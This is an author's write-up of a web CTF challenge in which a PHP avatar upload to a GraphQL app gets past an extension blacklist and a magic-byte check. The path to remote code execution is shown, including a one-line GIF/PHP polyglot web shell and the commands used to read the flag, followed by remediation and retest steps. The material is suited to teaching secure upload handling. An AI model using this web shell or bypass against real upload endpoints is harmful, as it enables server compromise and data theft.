# SnapConnect security report

Author document. Spoilers throughout. The flag value is omitted on purpose; `lab.yml` carries its SHA-256.

## 9.1 Executive summary

SnapConnect is a web CTF challenge built as a fictional social app with a product frontend and a GraphQL API. The avatar upload feature stacks an incomplete extension blacklist and a magic-byte-only content check, and the deployment executes `.php8` inside the upload directory. The primary vulnerability is unrestricted file upload leading to remote code execution, CWE-434.

A member with valid credentials uploads an image and PHP polyglot named `shell.jpg.php8`, requests it with a command parameter, and runs commands as `www-data` to read the flag. The impact is full server-side code execution inside the lab container.

The learning objective is recognizing that two shallow controls do not compose into one strong control. Remediation is an extension allowlist, whole-file re-encoding, randomized storage outside the executable path, and removing the stray handler mapping.

## 9.2 Challenge overview

The application is a PHP 8.3 service: a vanilla HTML, CSS, and JS frontend with no build pipeline, a GraphQL endpoint on `webonyx/graphql-php` v15.37.2, SQLite for members and tokens, and a writable `uploads/` directory under the document root. The scenario is an open-beta social app. Members claim a handle, write a bio, and upload an avatar through `mutation { uploadAvatar(file: Upload!) }` sent as `multipart/form-data` per the graphql-multipart-request spec.

Primary vulnerability: unrestricted file upload, CWE-434. Secondary: GraphQL schema exposure through introspection, which serves the recon step. Difficulty is easy with an estimated solve time of 10 to 30 minutes.

## 9.3 Architecture and trust boundaries

One container runs Apache with mod_php. The document root `/var/www/public` holds the app pages, the GraphQL endpoint at `/graphql`, the API reference at `/docs`, and the writable `uploads/` directory. Application code, vendor files, seeds, the SQLite database, and the flag sit outside the document root.

Request flow:

```
browser -- fetch + bearer token --> graphql.php --> webonyx executor --> resolvers
resolvers --> auth check --> uploads.php validation --> public/uploads/<original filename>
attacker GET /uploads/<file> --> mod_php executes .php8 --> read /var/www/flag.txt
```

Trust boundaries: the browser is untrusted. The bearer token gates member operations. The upload validator is the only control between client input and a writable, executable web directory. The flag is readable by `www-data` only through code execution. Member emails resolve only for the token owner.

## 9.4 Attacker starting point

- App: `http://localhost:8081` with open registration. No credentials are handed out.
- API: `POST /graphql`, with a neutral reference at `/docs`.
- Role after registration: `login`, `register`, `me`, `user`, `updateProfile`, `uploadAvatar`.
- Known: the flag path `/var/www/flag.txt`, and that introspection is enabled.

## 9.5 Attack surface

- `POST /graphql` with JSON: queries, mutations, introspection.
- `POST /graphql` with multipart per graphql-multipart-request: the avatar upload.
- `GET /docs` and `GET /openapi.json`: neutral Swagger UI reference.
- `GET /uploads/<file>`: stored uploads; `.php8` executes.
- `GET /health.php`: status JSON.

Controls in play: bearer-token authentication, the extension blacklist, the magic-byte check, a 2 MiB cap, a filename character policy, and input validation on registration and profile fields.

## 9.6 Vulnerability description

Component: `store_avatar()` in `app/src/uploads.php`, together with the handler mapping in `app/apache/php8-handler.conf`.

Preconditions: a member token, which open registration provides, and knowledge that uploads stay in `/uploads/`.

Two controls fail together. The extension check is a blacklist (`php, php3, php4, php5, php7, phtml, phar, pht`) that inspects only the final suffix and does not contain `php8`. The content check reads the first 8 bytes, compares them to JPEG, PNG, and GIF signatures, and trusts the remainder of the file.

Root cause: two deny-controls were assumed to compose into one strong control. Neither validates what the file is as a whole, and user content is written into executable web space under its original filename.

## 9.7 Intended attack path

Discovery and authentication:

```
curl -s http://localhost:8081/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { mutationType { fields { name } } } }"}'
-> {"data":{"__schema":{"mutationType":{"fields":[{"name":"login"},{"name":"register"},
    {"name":"updateProfile"},{"name":"uploadAvatar"}]}}}}

mutation { register(username: "solver", email: "solver@example.com",
                   password: "solver-pass-1") { token } }
-> {"data":{"register":{"token":"<64 hex>"}}}
```

Probing the controls. The multipart format comes from the profile editor's own upload request:

```
shell.php   -> {"errors":[{"message":"File type not allowed."}]}
shell.php8  -> {"errors":[{"message":"File does not look like an image."}]}
avatar.png  -> {"data":{"uploadAvatar":{"success":true,"url":"/uploads/avatar.png"}}}
```

Payload and execution:

```
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.jpg.php8
# upload as multipart: operations + map {"0":["variables.file"]} + file part
-> {"data":{"uploadAvatar":{"success":true,"url":"/uploads/shell.jpg.php8"}}}

GET /uploads/shell.jpg.php8?cmd=id
-> GIF89auid=33(www-data) gid=33(www-data) groups=33(www-data)

GET /uploads/shell.jpg.php8?cmd=cat /var/www/flag.txt
-> GIF89aduck{...}
```

## 9.8 Impact assessment

- Confidentiality: arbitrary file read as `www-data`, demonstrated by the flag. A real deployment would expose config files, secrets, and member data.
- Integrity: arbitrary code execution allows writing under the web root and modifying application data, including stored avatars.
- Availability: the service can be disrupted at will. The lab container resets, so impact is bounded.
- Privileges gained: command execution as `www-data`, one step from container escape in a real deployment and out of scope here.

## 9.9 Flag retrieval

The condition is command execution as `www-data` that reads `/var/www/flag.txt`. The route is `GET /uploads/shell.jpg.php8?cmd=cat /var/www/flag.txt`. Success returns a `duck{...}` value whose SHA-256 matches `flag_hash` in `lab.yml`. `ops/validate.py` asserts the match.

## 9.10 Root cause

The team trusted two controls because there were two, not because either was sound.

- Blacklist thinking: the list recorded extensions the team remembered, while the server's handler table contained one more. Deny-lists enumerate the past, not the configuration.
- Header-only validation: magic bytes identify the start of a file, not its entirety. Polyglots are trivial to build.
- Executable storage: user content landed in the document root under original filenames, where a handler mapping turns content into code.

## 9.11 Remediation

Full fix with code in `docs/REMEDIATION.md`:

1. Allow-list extensions (`jpg`, `jpeg`, `png`, `gif`, `webp`).
2. Decode and re-encode images server-side with GD and store only the re-encoded bytes.
3. Store under random names outside the document root. Serve through a controller that sets `Content-Type` and `X-Content-Type-Options: nosniff`.
4. Disable script execution in the upload directory and remove the `.php8` handler mapping.
5. Keep the size cap and filename policy. Add rate limiting for production.

## 9.12 Verification and retest

Vulnerable behavior, asserted by `ops/validate.py` from a clean state: `.php` uploads are rejected while `.php8` uploads pass, and the polyglot executes and reads the flag.

Expected secure behavior: only fully decodable images with allow-listed extensions are accepted, stored files have random names and cannot execute, and no handler maps `.php8`.

Retest procedure:

1. Apply the remediation patch.
2. Run `./reset.sh`, then `python3 ops/validate.py`.
3. Phases 0 to 4 pass. Phases 5 and 6 fail: the polyglot is rejected or inert, and nothing executes.

Regression: run `ops/validate.py` on every change. The phase 7 negative checks guard against reintroducing traversal or dotfile issues. The patched build must keep failing phases 5 and 6.

## 9.13 Unintended attack paths

- Path traversal in filenames — sanitized by `basename()` plus a character policy. solve.py asserts containment.
- `.htaccess` or `.user.ini` upload — rejected by the filename policy and the content check. `AllowOverride None` is set and mod_php ignores `.user.ini`.
- Overwriting application pages — blocked. Page names end in `.php`, which the blacklist rejects.
- Stored XSS through SVG or HTML uploads — blocked. No image signature matches, and profile text renders through `textContent` only.
- SQL injection — none. Every query is a prepared statement.
- Auth bypass or token guessing — none. Tokens are 256-bit random hex, passwords are hashed, login errors are generic.
- Mass assignment through `register` or `updateProfile` — none. Both take explicit arguments with length checks, and solve.py probes duplicates and invalid input.
- Email enumeration — none. Public profiles expose username, display name, bio, avatar, and join date. solve.py asserts email is null on public lookups.
- Static flag or source disclosure — none. Flag, source, vendor, seeds, and data live outside the document root. `Options -Indexes` is set.
- Client-side validation as the only barrier — none. The file input's `accept` list is cosmetic. All enforcement is server-side.

Each path was tested during development. None reaches the flag without the upload bypass.

## 9.14 Conclusion

The challenge models a realistic upload failure wrapped in a believable product: two shallow controls that look like defense in depth but share one blind spot, plus an executable upload directory. Solving it requires observing behavior, inferring both controls, and combining an extension gap with a polyglot payload.

The lesson transfers: upload validation needs allow-lists and whole-file verification, upload storage must never execute, and handler mappings must be reconciled with every filter that claims to protect them. The lab is deterministic, resets to a known state, and confines all impact to its container.
